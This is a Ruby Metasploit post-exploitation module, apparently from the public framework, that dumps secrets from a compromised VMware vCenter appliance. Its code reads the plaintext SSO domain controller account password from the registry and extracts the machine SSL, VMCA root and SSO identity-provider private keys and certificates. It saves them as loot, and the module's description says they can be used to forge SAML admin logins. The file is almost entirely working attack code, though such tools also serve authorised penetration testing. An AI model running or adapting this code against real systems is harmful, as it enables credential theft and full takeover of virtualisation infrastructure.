##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Auxiliary::Report

  Rank = ManualRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vCenter Secrets Dump',
        'Description' => %q{
          Grab secrets and keys from the vCenter server and add them to
          loot. This module is tested against the vCenter appliance only;
          it will not work on Windows vCenter instances. It is intended to
          be run after successfully acquiring root access on a vCenter
          appliance and is useful for penetrating further into the
          environment following a vCenter exploit that results in a root
          shell.

          Secrets include the dcAccountDN and dcAccountPassword for
          the vCenter machine which can be used for maniuplating the SSO
          domain via standard LDAP interface; good for plugging into the
          vmware_vcenter_vmdir_ldap module or for adding new SSO admin
          users. The MACHINE_SSL, VMCA_ROOT and SSO IdP certificates with
          assocaited private keys are also plundered and can be used to
          sign forged SAML assertions for the /ui admin interface.
        },
        'Author' => 'npm[at]cesium137.io',
        'Platform' => [ 'linux' ],
        'DisclosureDate' => '2022-04-15',
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'License' => MSF_LICENSE,
        'Actions' => [
          [
            'Dump',
            {
              'Description' => 'Dump vCenter Secrets'
            }
          ]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Privileged' => true
      )
    )

    register_advanced_options([
      OptString.new('RHOSTS', [ false, 'The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit' ]),
      OptPort.new('RPORT', [ false, 'The target port', 389 ]),
      OptBool.new('SSL', [ false, 'Enable SSL on the LDAP connection' ]),
      OptString.new('BASE_DN', [ false, 'Base DN to target on LDAP server' ]),
      OptString.new('BASE_FQDN', [ false, 'Base FQDN to target on LDAP server' ]),
      OptString.new('BIND_DN', [ false, 'The username to authenticate to LDAP server' ]),
      OptString.new('BIND_PW', [ false, 'Password for the BIND_DN' ]),
      OptString.new('VCENTER_FQDN', [ false, 'FQDN of the vCenter Server' ])
    ])
  end

  def rhosts
    datastore['RHOSTS']
  end

  def rport
    datastore['RPORT']
  end

  def base_dn
    datastore['BASE_DN']
  end

  def base_fqdn
    datastore['BASE_FQDN']
  end

  def bind_dn
    datastore['BIND_DN']
  end

  def bind_pw
    datastore['BIND_PW']
  end

  def ldap_url
    datastore['LDAP_URL']
  end

  def vcenter_fqdn
    datastore['VCENTER_FQDN']
  end

  def ssl
    datastore['SSL']
  end

  def run
    print_status('Gathering vSphere SSO Domain Information ...')
    unless vmdir_init
      print_error('Unable to contact vmdir')
      return
    end

    print_status('Extracting certificates from vSphere platform ...')
    unless vmafd_dump
      print_error('Unable to dump vmafd')
      return
    end
  end

  def vmdir_init
    if !command_exists?('/usr/lib/vmware-vmafd/bin/vmafd-cli') && !command_exists?('/opt/likewise/bin/lwregshell')
      print_error('Host does not appear to be a vSphere Platform Services Controller')
      return false
    end

    vsphere_machine_id = cmd_exec('/usr/lib/vmware-vmafd/bin/vmafd-cli get-machine-id --server-name localhost')
    unless validate_uuid(vsphere_machine_id)
      print_error('Invalid vSphere PSC Machine UUID returned from vmafd-cli!')
      return false
    end

    vprint_status("vSphere Machine ID: #{vsphere_machine_id}")

    vsphere_machine_hostname = cmd_exec('hostname')
    datastore['VCENTER_FQDN'] = vsphere_machine_hostname

    vsphere_machine_ipv4 = cmd_exec('ifconfig | grep eth0 -A1 | grep "inet addr" | awk -F \':\' \'{print $2}\' | awk -F \' \' \'{print $1}\'')

    unless validate_ipv4(vsphere_machine_ipv4)
      print_error('Could not determine vCenter eth0 IPv4!')
      return false
    end

    datastore['RHOSTS'] = vsphere_machine_ipv4

    vprint_status("vSphere Hostname and IPv4: #{vcenter_fqdn} [#{vsphere_machine_ipv4}]")

    vsphere_domain_name = cmd_exec('/opt/likewise/bin/lwregshell list_values \'[HKEY_THIS_MACHINE\Services\vmafd\Parameters]\'|grep DomainName|awk \'{print $4}\'|tr -d \'"\'')

    unless validate_fqdn(vsphere_domain_name)
      print_error('Could not determine vSphere SSO domain name!')
      return false
    end

    datastore['BASE_FQDN'] = vsphere_domain_name.to_s.downcase
    vprint_status("vSphere SSO Domain FQDN: #{base_fqdn}")

    vsphere_domain_dn = 'dc=' + base_fqdn.split('.').join(',dc=')
    datastore['BASE_DN'] = vsphere_domain_dn
    vprint_status("vSphere SSO Domain DN: #{base_dn}")

    print_status('Extracting dcAccountDN and dcAccountPassword via lwregshell on local vCenter ...')
    vsphere_domain_dc_dn = cmd_exec('/opt/likewise/bin/lwregshell list_values \'[HKEY_THIS_MACHINE\Services\vmdir]\'|grep dcAccountDN|awk \'{$1=$2=$3="";print $0}\'|tr -d \'"\'|sed -e \'s/^[ \t]*//\'')

    unless validate_dn(vsphere_domain_dc_dn)
      print_error('Could not determine vmdir dcAccountDN from lwregshell!')
      return false
    end

    datastore['BIND_DN'] = vsphere_domain_dc_dn
    print_good("vSphere SSO DC DN: #{bind_dn}")

    # The DC machine account credential is stored in plaintext within the registry!
    vsphere_domain_dc_pw = cmd_exec('printf $(/opt/likewise/bin/lwregshell list_values \'[HKEY_THIS_MACHINE\Services\vmdir]\'|grep dcAccountPassword|awk \'{print $4}\'|cut -c2-|rev|cut -c2-|rev)')

    unless vsphere_domain_dc_pw
      print_error('No dcAccountPassword credential returned from lwregshell query')
      return false
    end

    datastore['BIND_PW'] = vsphere_domain_dc_pw
    print_good("vSphere SSO DC PW: #{bind_pw}")

    unless save_vmdir_credential
      vprint_error('Unable to save credential to DB')
    end

    return true
  end

  def vmafd_dump
    if !command_exists?('/usr/lib/vmware-vmafd/bin/vecs-cli')
      print_error('Could not find vecs-cli')
      return false
    end

    shell_bind_pw = bind_pw.gsub('"', '\"')

    idp_keys = []
    idp_certs = []

    vprint_status('Extract MACHINE_SSL_CERT key ...')
    vcenter_machine_key_b64 = cmd_exec('/usr/lib/vmware-vmafd/bin/vecs-cli entry getkey --store MACHINE_SSL_CERT --alias __MACHINE_CERT')

    unless (vcenter_machine_key = OpenSSL::PKey::RSA.new(vcenter_machine_key_b64))
      print_error('Could not extract MACHINE_SSL_CERT private key')
      return false
    end

    vprint_status('Extract MACHINE_SSL_CERT cert ...')
    vcenter_machine_cert_b64 = cmd_exec('/usr/lib/vmware-vmafd/bin/vecs-cli entry getcert --store MACHINE_SSL_CERT --alias __MACHINE_CERT')

    unless (vcenter_machine_cert = OpenSSL::X509::Certificate.new(vcenter_machine_cert_b64))
      print_error('Could not extract MACHINE_SSL_CERT certificate')
      return false
    end

    unless vcenter_machine_cert.check_private_key(vcenter_machine_key)
      print_error('MACHINE_SSL_CERT certificate and private key mismatch!')
      return false
    end

    vprint_status('Extract VMCA_ROOT key ...')
    vmca_key_b64 = cmd_exec('cat /var/lib/vmware/vmca/privatekey.pem')

    unless (vmca_key = OpenSSL::PKey::RSA.new(vmca_key_b64))
      print_error('Could not extract VMCA_ROOT private key')
      return false
    end

    vprint_status('Extract VMCA_ROOT cert ...')
    vmca_cert_b64 = cmd_exec('cat /var/lib/vmware/vmca/root.cer')

    unless (vmca_cert = OpenSSL::X509::Certificate.new(vmca_cert_b64))
      print_error('Could not extract VMCA_ROOT certificate')
      return false
    end

    unless vmca_cert.check_private_key(vmca_key)
      print_error('VMCA_ROOT certificate and private key mismatch!')
      return false
    end

    print_status('Fetching objectclass=vmwSTSTenantCredential via vmdir LDAP ...')

    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{base_dn}\" -D \"#{bind_dn}\" -w \"#{shell_bind_pw}\" \"(objectclass=vmwSTSTenantCredential)\" vmwSTSPrivateKey | awk '/vmwSTSPrivateKey/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/vmwSTSPrivateKey::/\\n/g'"

    # I'm aware of the irony and there is probably a better way
    idp_key = cmd_exec(shell_cmd).strip!
    keycol = "#{idp_key}\n"
    keycol.each_line do |line|
      b64formatted = line.scan(/.{1,64}/).join("\n")
      idp_key_b64 = "-----BEGIN PRIVATE KEY-----\n#{b64formatted}\n-----END PRIVATE KEY-----"
      unless (privkey = OpenSSL::PKey::RSA.new(idp_key_b64))
        print_error('Error processing IdP trusted certificate private key')
        return false
      end
      idp_keys << privkey
    end

    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{base_dn}\" -D \"#{bind_dn}\" -w \"#{shell_bind_pw}\" \"(objectclass=vmwSTSTenantCredential)\" userCertificate | awk '/userCertificate/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/userCertificate::/\\n/g'"

    idp_chain = cmd_exec(shell_cmd).strip!
    certcol = "#{idp_chain}\n"
    certcol.each_line do |line|
      b64formatted = line.scan(/.{1,64}/).join("\n")
      idp_cert_b64 = "-----BEGIN CERTIFICATE-----\n#{b64formatted}\n-----END CERTIFICATE-----"
      unless (idp_cert = OpenSSL::X509::Certificate.new(idp_cert_b64))
        print_error('Error processing IdP trusted certificate chain')
        return false
      end
      idp_certs << idp_cert
    end

    sts_pem = nil
    sts_cert = nil
    sts_key = nil

    print_status('Parsing vmwSTSTenantCredential certificates and keys ...')

    # vCenter vmdir stores the STS IdP signing credential under the following DN:
    #    cn=TenantCredential-1,cn=<sso domain>,cn=Tenants,cn=IdentityManager,cn=Services,<root dn>
    #
    # TODO: Right now this returns only the first valid keypair that is found and stops iterating
    #      or dies if no valid keypair is located. This is fine for 99% of cases but complex or
    #      unusual environments may have more than one TenantCredential and currently we stop
    #      extracting keys at the first valid pair.

    idp_keys.each do |stskey|
      idp_certs.each do |stscert|
        next unless stscert.check_private_key(stskey)

        sts_cert = stscert.to_pem.to_s
        sts_key = stskey.to_pem.to_s
        unless validate_sts_cert(sts_cert) # Query IDM to compare our extracted cert with the IDM advertised cert
          print_error('vCenter STS IdP cert extracted from vmdir does not match STS IdP cert chain advertised by IDM!')
          return false
        end
        print_status('Validated vSphere SSO IdP certificate against vSphere IDM tenant certificate')
        sts_pem = "#{sts_key}#{sts_cert}"
      end
    end

    unless sts_pem # We were unable to link a public and private key together
      print_error('SSO_STS_IDP certificate and private key mismatch!')
      return false
    end

    # The loot is GOOD, and it is ours
    print_good('=> CHA-CHING! <=')

    machine_pem = "#{vcenter_machine_key.to_pem}#{vcenter_machine_cert.to_pem}"

    p = store_loot('ssl', 'PEM', rhosts, vcenter_machine_key.to_pem.to_s, 'MACHINE_SSL.key', 'vCenter MACHINE_SSL private key')
    print_good("MACHINE_SSL_KEY: #{p}")

    p = store_loot('ssl', 'PEM', rhosts, vcenter_machine_cert.to_pem.to_s, 'MACHINE_SSL.pem', 'vCenter MACHINE_SSL certificate')
    print_good("MACHINE_SSL_CERT: #{p}")

    vprint_good("MACHINE_SSL:\n#{machine_pem}")

    vmca_pem = "#{vmca_key.to_pem}#{vmca_cert.to_pem}"

    p = store_loot('vmca', 'PEM', rhosts, vmca_key.to_pem.to_s, 'VMCA_ROOT.key', 'vCenter VMCA private key')
    print_good("VMCA_ROOT_KEY: #{p}")

    p = store_loot('vmca', 'PEM', rhosts, vmca_cert.to_pem.to_s, 'VMCA_ROOT.pem', 'vCenter VMCA certificate')
    print_good("VMCA_ROOT_CERT: #{p}")

    vprint_good("VMCA_ROOT:\n#{vmca_pem}")

    p = store_loot('idp', 'PEM', rhosts, sts_key, 'SSO_STS_IDP.key', 'vCenter SSO IdP private key')
    print_good("SSO_STS_IDP_KEY: #{p}")

    p = store_loot('idp', 'PEM', rhosts, sts_cert, 'SSO_STS_IDP.pem', 'vCenter SSO IdP certificate')
    print_good("SSO_STS_IDP_CERT: #{p}")

    vprint_good("SSO_STS_IDP:\n#{sts_pem}")

    return true
  end

  def validate_uuid(uuid)
    uuid_regex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/
    return true if uuid_regex.match?(uuid.to_s.downcase)

    return false
  end

  def validate_ipv4(ipv4)
    ip = IPAddr.new ipv4.to_s
    unless ip
      return false
    end

    return true
  end

  def validate_fqdn(fqdn)
    fqdn_regex = /(?=^.{4,253}$)(^((?!-)[a-zA-Z0-9-]{0,62}[a-zA-Z0-9]\.)+[a-zA-Z]{2,63}$)/
    return true if fqdn_regex.match?(fqdn.to_s.downcase)

    return false
  end

  def validate_dn(dn)
    dn_regex = /^(?:(?<cn>cn=(?<name>[^,]*)),)?(?:(?<path>(?:(?:cn|ou)=[^,]+,?)+),)?(?<domain>(?:dc=[^,]+,?)+)$/
    return true if dn_regex.match?(dn.to_s.downcase)

    return false
  end

  def validate_sts_cert(test_cert)
    unless (cert = OpenSSL::X509::Certificate.new(test_cert))
      print_error('Invalid x509 certificate received!')
      return false
    end

    vprint_status('Downloading advertised IDM tenant certificate chain from http://localhost:7080/idm/tenant/ on local vCenter ...')

    idm_cmd = cmd_exec("curl -f -s http://localhost:7080/idm/tenant/#{base_fqdn}/certificates?scope=TENANT")

    unless (idm_json = JSON.parse(idm_cmd).first)
      print_error('Unable to parse IDM tenant certificates downloaded from http://localhost:7080/idm/tenant/ on local vCenter')
      return false
    end

    idm_json['certificates'].each do |idm|
      unless (cert_verify = OpenSSL::X509::Certificate.new(idm['encoded']))
        print_error('Invalid x509 certificate extracted from IDM!')
        return false
      end

      unless cert == cert_verify
        next
      end

      return true
    end

    vprint_error('No vSphere IDM tenant certificates returned from http://localhost:7080/idm/tenant/')

    return false
  end

  def save_vmdir_credential
    service_data = {
      address: Rex::Socket.getaddress(rhosts),
      port: rport,
      service_name: (ssl ? 'ldaps' : 'ldap'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: base_fqdn,
      username: bind_dn,
      private_type: :password,
      private_data: bind_pw
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data)
    }.merge(service_data)

    create_credential_login(login_data)
  end

end
